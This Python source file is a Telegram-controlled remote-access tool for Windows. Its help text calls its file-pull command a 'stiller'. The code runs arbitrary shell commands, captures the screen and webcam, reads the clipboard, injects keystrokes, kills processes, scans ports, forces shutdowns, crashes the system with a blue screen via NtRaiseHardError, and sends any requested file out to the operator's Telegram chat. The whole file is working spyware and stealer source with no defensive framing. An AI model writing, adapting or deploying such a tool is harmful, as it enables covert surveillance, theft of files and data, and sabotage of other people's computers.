import logging
from aiogram import Bot, Dispatcher, types, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import BufferedInputFile
from aiogram.utils.keyboard import ReplyKeyboardBuilder, KeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
import ctypes
from ctypes import wintypes
import os
import json

def load_data():
    try:
        with open("user.json", "r", encoding="utf-8") as v:
            data = json.load(v)
            return data
    except FileNotFoundError:
        print("i cant found 'user.json'\n")

class WindowKillStates(StatesGroup):
    waiting_for_confirm = State()

class Core:
    def __init__(self, token, admin):
        self.bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
        self.dp = Dispatcher()
        self.router = Router()
        self.ADMIN_ID = admin
        self.text = """ ᅠ
        
/help - show all commands\n
/scr - takes a screenshot of the entire screen\n
/cmd - runs command from cmd\n
/write - entrys any text\n
/key - presses any keys\n
/ct_notify - dialog window on ctypes\n
/pl_notify - notification on plyer\n
/sinfo - all information about system\n
/pinfo - info about all active windows\n
/clipb - getting any text from clipboard\n
/web - opening any urls\n
/mon - off, on and lock display\n 
/wkill - killing active window\n
/shutdown - shutdown or reboot pc\n
/pscan - scanning all ports\n
/bsod - blue screen of death\n
/cam - takes screenshot from the front camera\n
/get - get files from pc (stiller)\n
        """

        self.bind_handlers()
        self.dp.include_router(self.router)

    def bind_handlers(self):
        self.router.message.register(self.start_command, Command("start"))
        self.router.message.register(self.help_command, Command("help"))
        self.router.message.register(self.cmd_command, Command("cmd"))
        self.router.message.register(self.screenshot_command, Command("scr"))
        self.router.message.register(self.write_command, Command("write"))
        self.router.message.register(self.key_command, Command("key"))
        self.router.message.register(self.notify_command, Command("ct_notify"))
        self.router.message.register(self.pl_notif, Command("pl_notify"))
        self.router.message.register(self.monitor_commands, Command("mon"))
        self.router.message.register(self.window_kill_command, Command("wkill"))
        self.router.message.register(self.process_answer, WindowKillStates.waiting_for_confirm)
        self.router.message.register(self.sinfo_command, Command("sinfo"))
        self.router.message.register(self.list_all_windows, Command("pinfo"))
        self.router.message.register(self.get_clipboard, Command("clipb"))
        self.router.message.register(self.web_command, Command("web"))
        self.router.message.register(self.scan_port, Command("pscan"))
        self.router.message.register(self.shutdown_command, Command("shutdown"))
        self.router.message.register(self.bsod_command, Command("bsod"))
        self.router.message.register(self.send_jpg, Command("cam"))
        self.router.message.register(self.get_files, Command("get"))


    async def start_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            user = message.from_user
            await self.bot.send_message(self.ADMIN_ID, f"КТО-ТО ПОПЫТАЛСЯ ПОЛУЧИТЬ ДОСТУП К БОТУ\n@{user.username}\nID: <code>{user.id}</code>")
            return
        com_list = ["/help", "/cmd", "/scr", "/write", "/key", "/ct_notify", "/pl_notify", "/mon", "/wkill", "/sinfo", "/pinfo", "/clipb", "/web", "/pscan", "/shutdown", "/bsod", "/cam", "/get"]
        builder = ReplyKeyboardBuilder()
        for com in com_list:
            builder.add(KeyboardButton(text=com))
        builder.adjust(3)

        await message.answer("hello.", reply_markup=builder.as_markup(resize_keyboard=True))

    async def help_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        try:
            await self.bot.send_message(self.ADMIN_ID, self.text)
        except Exception as e:
            await message.reply(f"Error\n{e}")

    async def cmd_command(self, message: types.Message):
        import subprocess
        if message.from_user.id != self.ADMIN_ID:
            return

        cmd = message.text.replace("/cmd ", "").strip()
        if not cmd:
            await message.reply("command?")
            return

        try:
            process = subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp866',)
            stdout, stderr = process.communicate()
            if stderr:
                await message.reply(f"Ошибка: {cmd}\n`{stderr}`", parse_mode="Markdown")
                return
            await message.reply(f"Команда выполнена: {cmd}\n`{stdout}`", parse_mode="Markdown")
        except Exception as e:
            await message.reply(f"Error\n{e}")

    async def screenshot_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import io
        import pyautogui
        try:
            buffer = io.BytesIO()
            screenshot = pyautogui.screenshot()
            screenshot.save(buffer, format='PNG')
            pngs = BufferedInputFile(
                file=buffer.getvalue(),
                filename="scr.png"
            )
            await self.bot.send_photo(self.ADMIN_ID, photo=pngs)
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def write_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from pynput.keyboard import Controller
        keyboard = Controller()

        text = message.text.replace("/write ", "").strip()
        if not text:
            await message.reply("write any text")
            return
        try:
            keyboard.type(text)
            await message.reply(f"writed: {text}")
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def key_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return


        from pynput.keyboard import Controller, Key
        keyboard = Controller()

        special_keys = {
            "enter": Key.enter,
            "space": Key.space,
            "tab": Key.tab,
            "shift": Key.shift,
            "ctrl": Key.ctrl,
            "alt": Key.alt,
            "backspace": Key.backspace,
            "esc": Key.esc,
            "up": Key.up,
            "down": Key.down,
            "left": Key.left,
            "right": Key.right,
            "f1": Key.f1,
            "f2": Key.f2,
            "f3": Key.f3,
            "f4": Key.f4,
            "f5": Key.f5,
            "f6": Key.f6,
            "f7": Key.f7,
            "f8": Key.f8,
            "f9": Key.f9,
            "f10": Key.f10,
            "f11": Key.f11,
            "f12": Key.f12,
        }

        key_text = message.text.replace("/key ", "").strip()
        if not key_text:
            await message.reply(f"{special_keys}")
            return

        try:
            if "+" in key_text:
                combo = key_text.split("+")
                keys = [special_keys.get(k.lower(), k) for k in combo]
                for k in keys:
                    keyboard.press(k)
                for k in reversed(keys):
                    keyboard.release(k)
            else:
                key = special_keys.get(key_text.lower(), key_text)
                keyboard.press(key)
                keyboard.release(key)

            await message.reply(f"key pressed: {key_text}")

        except Exception as e:
            await message.reply(f"error\n{e}")

    async def notify_command(self, message: types.Message):
        import threading as th
        if message.from_user.id != self.ADMIN_ID:
            return

        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            await message.reply("/ct_notify [text]")
            return
        text = parts[1]
        try:
            th.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "Hello, friend.", 0x10), daemon=True).start()
            await message.reply(f"Message was shown\ntext: {text}")
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def pl_notif(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from plyer import notification
        import threading as th

        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            await message.reply("preview /pl_notify [заголовок] [текст]")
            return

        title = parts[1].lower()
        text = parts[2]

        try:
            th.Thread(target=lambda: notification.notify(title=title, message=text, app_name="System", timeout=10),daemon=True).start()
            await message.reply(f"уведомление показано:\nЗаголовок: {title}\nТекст: {text}")
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def monitor_commands(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        try:
            from files import mon
            await mon.mon_start(message)
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def window_kill_command(self, message: types.Message, state: FSMContext):
        if message.from_user.id != self.ADMIN_ID:
            return


        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()

            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                title = buff.value
            else:
                title = "Заголовок отсутствует"

            pid = wintypes.DWORD()
            user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            pid_value = pid.value

            info_text = f"Window: {title}\nHWND:{hwnd}\nPID: {pid_value}\n\nЗакрыть? (y/n)"

            await state.update_data(kill_hwnd=hwnd, kill_pid=pid_value, kill_title=title)
            await state.set_state(WindowKillStates.waiting_for_confirm)

            await message.answer(info_text)

        except Exception as e:
            await message.reply(f"error\n{e}")

    async def process_answer(self, message: types.Message, state: FSMContext):
        try:
            user32 = ctypes.windll.user32

            data = await state.get_data()
            hwnd = data['kill_hwnd']
            pid_value = data['kill_pid']
            title = data['kill_title']

            answer = message.text.lower().strip()

            if answer in ("y", "н"):
                if user32.IsWindow(hwnd):
                    os.system(f"taskkill /PID {pid_value} /F /T >nul 2>&1")
                    await self.bot.send_message(message.chat.id, f"{title}\nPID: {pid_value}\nwas closed")
                else:
                    await self.bot.send_message(message.chat.id, "window not found")

            elif answer in ("n", "б"):
                await message.answer("Отмена.")
            else:
                await message.answer("??? restart /wkill")

            await state.clear()

        except Exception as e:
            await message.reply(f"error\n{e}")
            await state.clear()


    async def sinfo_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        try:
            from files import io_info_send as ioi
            await ioi.run()
        except Exception as e:
            await message.reply(f"error\n{e}")



    async def list_all_windows(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        user32 = ctypes.windll.user32
        WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        windows_list = []

        # noinspection PyUnusedLocal
        def enum_windows_proc(hwnd, lparam):
            if user32.IsWindowVisible(hwnd):
                length = user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buff = ctypes.create_unicode_buffer(length + 1)
                    user32.GetWindowTextW(hwnd, buff, length + 1)
                    windows_list.append(f"ID `{hwnd}`\nTitle: {buff.value}")

            return True

        try:
            user32.EnumWindows(WNDENUMPROC(enum_windows_proc), 0)
        except Exception as e:
            return await message.reply(f"Ошибка при переборе: {e}")

        if windows_list:
            full_message = "Windows list:\n\n" + "\n\n".join(windows_list)
            if len(full_message) > 4096:
                for x in range(0, len(full_message), 4096):
                    await message.answer(full_message[x:x + 4096], parse_mode="Markdown")
            else:
                await message.answer(full_message, parse_mode="Markdown")
        else:
            await message.answer("Windows not found")

    async def get_clipboard(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        from ctypes import wintypes
        CF_UNICODETEXT = 13

        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        user32.OpenClipboard.argtypes = [wintypes.HWND]

        user32.GetClipboardData.restype = wintypes.HANDLE
        user32.GetClipboardData.argtypes = [wintypes.UINT]

        kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
        kernel32.GlobalLock.restype = wintypes.LPVOID

        kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]

        def get_clipboard_text():
            text = None

            if user32.OpenClipboard(None):
                try:
                    h_data = user32.GetClipboardData(CF_UNICODETEXT)
                    if h_data:
                        ptr = kernel32.GlobalLock(h_data)
                        if ptr:
                            text = ctypes.c_wchar_p(ptr).value
                            kernel32.GlobalUnlock(h_data)
                finally:
                    user32.CloseClipboard()

            return text

        try:
            data = get_clipboard_text()
            if data:
                await self.bot.send_message(self.ADMIN_ID, f"clipboard: {data}")
            else:
                await message.answer("none..")
        except Exception as er:
            await message.reply(f"error\n{er}")

    async def web_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import webbrowser
        url = message.text.replace("/web ", "").strip()
        try:
            webbrowser.open(url)
            await message.reply("url was opened")
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def scan_port(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        try:
            from files import port_scan
            await port_scan.run()
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def shutdown_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return

        import subprocess
        parts = message.text.split(maxsplit=1)
        arg = parts[1]
        if len(parts) < 2:
            await self.bot.send_message(self.ADMIN_ID, "arguments\ns - shutdown\nr - reboot")
            return

        if arg == "s":
            try:
                subprocess.run(["shutdown", "/S", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                await self.bot.send_message(self.ADMIN_ID, f"error\n{e}")
            await self.bot.send_message(self.ADMIN_ID, "pc was shutdowned")
            return

        if arg == "r":
            try:
                subprocess.run(["shutdown", "/R", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                await self.bot.send_message(self.ADMIN_ID, f"error\n{e}")
            await self.bot.send_message(self.ADMIN_ID, "pc was rebooted")
            return

    async def bsod_command(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        try:
            ntdll = ctypes.windll.ntdll
            enabled = ctypes.c_bool()
            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))

            response = ctypes.c_uint()
            ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(response))
        except Exception as e:
            await message.reply(f"error\n{e}")

    async def send_jpg(self, message: types.Message):
        import cv2
        import io
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)

        if not cap.isOpened():
            await message.reply("не удалось найти камеру")
            return

        for _ in range(5):
            cap.read()

        ret, frame = cap.read()

        try:
            if ret:
                success, buffer = cv2.imencode('.jpg', frame)
                if success:
                    photo_io = io.BytesIO(buffer)

                    jpgio = BufferedInputFile(
                        file=photo_io.getvalue(),
                        filename="cvcam.jpg"
                    )

                    await self.bot.send_photo(self.ADMIN_ID, photo=jpgio)
            cap.release()
        except Exception as e:
            await message.reply(f"error\n{e}")



    async def get_files(self, message: types.Message):
        if message.from_user.id != self.ADMIN_ID:
            return
        from aiogram.types import FSInputFile

        path = message.text.replace("/get ", "").strip().replace('"', '')

        if not path:
            return await message.reply("write path to file")

        if not os.path.exists(path):
            return await message.reply("error: файл не найден")

        try:
            await message.answer("wait..")

            document = FSInputFile(path)
            await self.bot.send_document(self.ADMIN_ID, document=document)

        except Exception as e:
            await message.reply(f"Ошибка при отправке: {e}")

    async def run(self):
        print(True)
        logging.basicConfig(level=logging.INFO)
        await self.dp.start_polling(self.bot, skip_updates=False)

if __name__ == '__main__':
    import asyncio
    get = load_data()
    TOKEN = get["token_1"]
    ADMIN = get["admin"]
    try:
        app = Core(TOKEN, ADMIN)
        asyncio.run(app.run())
    except Exception as r:
        print(r)